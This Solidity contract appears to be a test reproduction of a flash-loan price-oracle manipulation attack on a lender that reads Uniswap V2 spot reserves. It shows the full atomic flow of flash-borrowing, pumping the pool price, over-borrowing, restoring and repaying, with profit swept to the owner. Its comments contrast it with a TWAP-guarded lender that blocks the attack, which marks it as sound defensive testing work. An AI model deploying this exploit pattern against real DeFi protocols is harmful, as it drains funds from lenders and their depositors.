// SPDX-License-Identifier: MIT
// Attacker for the oracle-manipulation repro. Demonstrates the exact flow
// from the triage signal — flash loan -> distort spot -> exploit the
// consumer -> restore -> repay — atomically, using Uniswap V2 flash swaps
// (borrowed tokens are repaid in the SAME transaction, no upfront capital).
//
//   poolB: flash-borrows FLASH CASH (callback fires mid-swap)
//     1. DISTORT: buy collateral in poolA with the flash cash -> the spot
//        price the lender reads pumps ~+125%
//     2. EXPLOIT: deposit the attacker's own collateral, borrow the maximum
//        the pumped spot allows from the lender that reads getReserves()
//     3. RESTORE: sell the flash-bought collateral back — reserves return
//        to ~honest shape, the pool keeps only the 2x 0.3% fees
//     4. REPAY poolB (principal + 0.3% fee), sweep the profit to the owner
//
// vs TwapGuardLender (30-min TWAP + 5% deviation guard): step 2 reverts.
// The attacker's own 100k COL stays locked as deposit — the profit is the
// cash spread, asserted in the test.
pragma solidity ^0.8.0;

import {ERC20Mintable} from "../tokens/ERC20Mintable.sol";
import {BaseLender} from "../OracleTargets.sol";
import {IUniswapV2PairLocal, IUniswapV2CalleeLocal} from "../interfaces/IUniswapV2PairLocal.sol";

contract OracleAttackRepro is IUniswapV2CalleeLocal {
    address public immutable owner;
    ERC20Mintable public immutable collateral; // token0 — the priced asset
    ERC20Mintable public immutable borrowTok;  // token1 — the lent asset
    IUniswapV2PairLocal public immutable poolA; // pair the lender reads (the oracle)
    IUniswapV2PairLocal public immutable poolB; // flash-loan source (left intact)
    BaseLender public immutable target;
    uint256 public immutable loanAmount;

    uint256 private ownColl; // attacker's own capital, captured before the loan

    constructor(
        address _collateral,
        address _borrow,
        address _poolA,
        address _poolB,
        BaseLender _target,
        uint256 _loanAmount
    ) {
        owner = msg.sender;
        collateral = ERC20Mintable(_collateral);
        borrowTok = ERC20Mintable(_borrow);
        poolA = IUniswapV2PairLocal(_poolA);
        poolB = IUniswapV2PairLocal(_poolB);
        target = _target;
        loanAmount = _loanAmount;
    }

    function attack() external {
        require(msg.sender == owner, "only owner");
        // Snapshot the attacker's own capital held by this contract; only
        // this amount is deposited as collateral. Everything else in the
        // collateral balance after the flash is the flash-bought inventory.
        ownColl = collateral.balanceOf(address(this));
        // Flash swap: pull cash out of poolB, repay cash + 0.3% fee inside
        // the callback. poolA (the oracle pair) is never touched by the loan.
        poolB.swap(0, loanAmount, address(this), abi.encode("repro"));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(poolB), "only poolB");

        // ---- 1. DISTORT: buy collateral in poolA with the flash cash.
        // The swap completes before we price anything, so the reserves (and
        // every spot read downstream) are already pumped.
        (uint112 r0, uint112 r1, ) = poolA.getReserves();
        uint256 inFee = loanAmount * 997;
        uint256 collOut = (inFee * r0) / (r1 * 1000 + inFee);
        borrowTok.transfer(address(poolA), loanAmount);
        poolA.swap(collOut, 0, address(this), new bytes(0));

        // ---- 2. EXPLOIT: deposit our own collateral, valued by the lender
        // at the pumped spot, and borrow the maximum it allows.
        collateral.approve(address(target), ownColl);
        target.depositCollateral(ownColl);
        (r0, r1, ) = poolA.getReserves();
        uint256 pumpedPrice = (uint256(r1) * 1e18) / uint256(r0);
        target.borrow(ownColl * pumpedPrice / 1e18);

        // ---- 3. RESTORE: sell the flash-bought collateral back at the
        // still-pumped pool, recovering nearly all of the flash principal.
        uint256 bought = collateral.balanceOf(address(this)); // == collOut
        (r0, r1, ) = poolA.getReserves();
        uint256 cashBack = (bought * 997 * r1) / (r0 * 1000 + bought * 997);
        collateral.transfer(address(poolA), bought);
        poolA.swap(0, cashBack, address(this), new bytes(0));

        // ---- 4. REPAY the flash loan (principal + 0.3% fee on principal).
        borrowTok.transfer(address(poolB), loanAmount + (loanAmount * 3) / 997 + 1);

        // Sweep the profit to the owner (the test asserts on it there).
        uint256 cash = borrowTok.balanceOf(address(this));
        if (cash > 0) borrowTok.transfer(owner, cash);
        uint256 coll = collateral.balanceOf(address(this));
        if (coll > 0) collateral.transfer(owner, coll);
    }
}
